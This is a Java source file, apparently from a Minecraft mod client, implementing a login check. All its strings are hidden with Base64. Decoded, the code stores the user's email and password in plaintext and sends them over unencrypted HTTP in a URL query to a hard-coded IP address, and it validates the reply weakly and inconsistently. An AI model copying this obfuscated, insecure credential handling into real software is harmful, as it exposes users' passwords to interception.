package me.pk2.util;

import us.np.moodlymod.util.ConfigUtils;

import javax.swing.*;
import java.net.HttpURLConnection;
import java.util.Base64;

public class Auth {
    public static ConfigUtils configUtils = new ConfigUtils(new String(Base64.getDecoder().decode("YXV0aA==")), new String(Base64.getDecoder().decode("YXV0aA==")));

    public static void auth() {
        JOptionPane optionPane = new JOptionPane();
        JFrame jFrame = new JFrame();
        jFrame.setAlwaysOnTop(true);

        Object[] _x = {configUtils.get(new String(Base64.getDecoder().decode("dQ=="))), configUtils.get(new String(Base64.getDecoder().decode("cA==")))};
        boolean _y = false;
        for(Object object : _x)
            if(object == null)
                _y = true;
        if(_y) {
            configUtils.set(new String(Base64.getDecoder().decode("dQ==")), new String(Base64.getDecoder().decode("SU5WQUxJRA==")));
            configUtils.set(new String(Base64.getDecoder().decode("cA==")), new String(Base64.getDecoder().decode("SU5WQUxJRA==")));
            configUtils.save();

            JOptionPane.showMessageDialog(jFrame, new String(Base64.getDecoder().decode("SW52YWxpZCBsb2dpbiEgUGxlYXNlIGxvZ2luIHdpdGggdGhlIGxhdW5jaGVyIGZpcnN0IQ==")));
            String user = JOptionPane.showInputDialog(jFrame, "Email: ");
            String pass = JOptionPane.showInputDialog(jFrame, "Password: ");
            configUtils.set(new String(Base64.getDecoder().decode("dQ==")), user);
            configUtils.set(new String(Base64.getDecoder().decode("cA==")), pass);
            configUtils.save();
        }
        try {
            HttpURLConnection connection = PostRequest.genCon(new String(Base64.getDecoder().decode("aHR0cDovLzIwNS4xMzQuMTgyLjE3L2FwaS9hdXRoZW50aWNhdGUucGhwP21haWw9")) + configUtils.getJSON().getString(new String(Base64.getDecoder().decode("dQ=="))) + new String(Base64.getDecoder().decode("JnBhc3M9")) + configUtils.getJSON().getString(new String(Base64.getDecoder().decode("cA=="))));
            String _ = PostRequest.read(connection);
            if(_.startsWith("11") || _.endsWith("111")) return;
            else {
                optionPane.createDialog(new String(Base64.getDecoder().decode("SW52YWxpZCBsb2dpbiEgUGxlYXNlIGxvZ2luIHdpdGggdGhlIGxhdW5jaGVyIGZpcnN0IQ=="))).setAlwaysOnTop(true);
                String user = JOptionPane.showInputDialog(jFrame, "Email: ");
                String pass = JOptionPane.showInputDialog(jFrame, "Password: ");
                configUtils.set(new String(Base64.getDecoder().decode("dQ==")), user);
                configUtils.set(new String(Base64.getDecoder().decode("cA==")), pass);
                configUtils.save();
            }

            HttpURLConnection con2 = PostRequest.genCon(new String(Base64.getDecoder().decode("aHR0cDovLzIwNS4xMzQuMTgyLjE3L2FwaS9hdXRoZW50aWNhdGUucGhwP21haWw9")) + configUtils.getJSON().getString(new String(Base64.getDecoder().decode("dQ=="))) + new String(Base64.getDecoder().decode("JnBhc3M9")) + configUtils.getJSON().getString(new String(Base64.getDecoder().decode("cA=="))));
            String _2 = PostRequest.read(con2);
            if(_2.startsWith("11") || _2.endsWith("1")) return;
        } catch (Exception e) { e.printStackTrace(); }

        optionPane.createDialog(new String(Base64.getDecoder().decode("SW52YWxpZCBsb2dpbiEgUGxlYXNlIGxvZ2luIHdpdGggdGhlIGxhdW5jaGVyIGZpcnN0IQ=="))).setAlwaysOnTop(true);
        System.exit(0);
        return;
    }
}